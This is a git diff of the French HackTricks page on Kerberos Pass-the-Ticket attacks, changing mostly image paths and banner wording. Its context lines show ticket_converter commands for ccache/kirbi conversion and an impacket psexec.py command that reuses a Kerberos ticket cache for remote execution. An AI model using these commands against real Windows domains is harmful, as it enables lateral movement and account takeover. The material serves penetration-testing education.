@@ -14,7 +14,7 @@ Autres moyens de soutenir HackTricks :
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser des workflows** facilement, alimentés par les outils communautaires **les plus avancés**.\
@@ -33,14 +33,14 @@ Ce type d'attaque est similaire à Pass the Key, mais au lieu d'utiliser des hac
 
 ### **Échange de tickets Linux et Windows entre plateformes**
 
-Le script [ticket\_converter](https://github.com/Zer1t0/ticket\_converter). Les seuls paramètres nécessaires sont le ticket actuel et le fichier de sortie, il détecte automatiquement le format du fichier de ticket d'entrée et le convertit. Par exemple :
+Le script [ticket\_converter](https://github.com/Zer1t0/ticket\_converter). Les seuls paramètres nécessaires sont le ticket actuel et le fichier de sortie, il détecte automatiquement le format du fichier ticket d'entrée et le convertit. Par exemple :
 ```
 root@kali:ticket_converter# python ticket_converter.py velociraptor.ccache velociraptor.kirbi
 Converting ccache => kirbi
 root@kali:ticket_converter# python ticket_converter.py velociraptor.kirbi velociraptor.ccache
 Converting kirbi => ccache
 ```
-[Kekeo](https://github.com/gentilkiwi/kekeo), pour les convertir sous Windows. Cet outil n'a pas été vérifié car il nécessite une licence pour leur bibliothèque ASN1, mais je pense qu'il mérite d'être mentionné.
+[Kekeo](https://github.com/gentilkiwi/kekeo), pour les convertir sous Windows. Cet outil n'a pas été vérifié car il nécessite une licence pour leur bibliothèque ASN1, mais je pense qu'il est important de le mentionner.
 
 ### Attaque Pass The Ticket
 
@@ -49,7 +49,7 @@ Converting kirbi => ccache
 export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
 python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
 ```
-```markdown
+```
 {% endcode %}
 
 {% code title="Windows" %}
@@ -65,10 +65,10 @@ klist #List tickets in cache to cehck that mimikatz has loaded the ticket
 
 * [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et **automatiser des workflows** avec les outils communautaires **les plus avancés**.\
+Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et **automatiser des workflows** grâce aux outils communautaires **les plus avancés**.\
 Obtenez l'accès aujourd'hui :
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
